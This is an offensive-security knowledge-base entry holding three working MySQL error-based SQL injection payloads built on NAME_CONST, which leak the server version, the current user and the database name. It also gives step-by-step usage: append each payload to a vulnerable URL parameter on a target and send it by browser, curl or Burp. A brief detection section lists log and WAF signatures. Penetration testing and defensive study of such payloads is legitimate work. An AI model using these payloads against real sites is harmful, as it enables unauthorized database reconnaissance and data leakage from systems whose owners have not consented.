---
type: code
language: SQL
verified: true
tags:
  - sqli
  - error-based
  - mysql-injection
  - nameconst
platforms:
  - Web
  - MySQL
validated: true
---

# mysql-nameconst-error-based-injection-queries

## Code

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

## Description

This SQL code snippet contains three injection payloads designed for error-based SQL injection in MySQL using the NAME_CONST function. Each payload targets a vulnerable URL parameter (e.g., ?id=1) to force a subquery that triggers an error, leaking the result of MySQL system functions (version(), user(), database()) in the error message. The duplicate NAME_CONST calls and aliasing ensure the subquery structure causes the desired error while commenting out the rest of the query with --.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `id=1` | Vulnerable parameter value to inject after; replace with actual injection point | `id=1` |

No other variables; the functions (version(), user(), database()) are built-in MySQL calls.

## Usage

Append each payload to a vulnerable GET parameter in a web application URL, such as http://target.com/vuln.php?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--. Submit the request and inspect the error response for leaked data (e.g., error mentioning the version string). Use sequentially: first for version, then user, then database. This is ideal for initial reconnaissance in black-box testing where direct DB access is unavailable. Deliver via browser, curl, or Burp Suite repeater.

## Detection

- Web server logs showing anomalous queries with subqueries and NAME_CONST usage.
- Increased error rates in application logs with patterns matching "Incorrect arguments to NAME_CONST".
- WAF alerts on SQL injection signatures involving AND clauses, subqueries, or comment terminators (--).
- Database error logs capturing the injected subquery structure.

## Related

- [[procedures/MySQL-Error-Based-Injection-Using-NAME_CONST]]
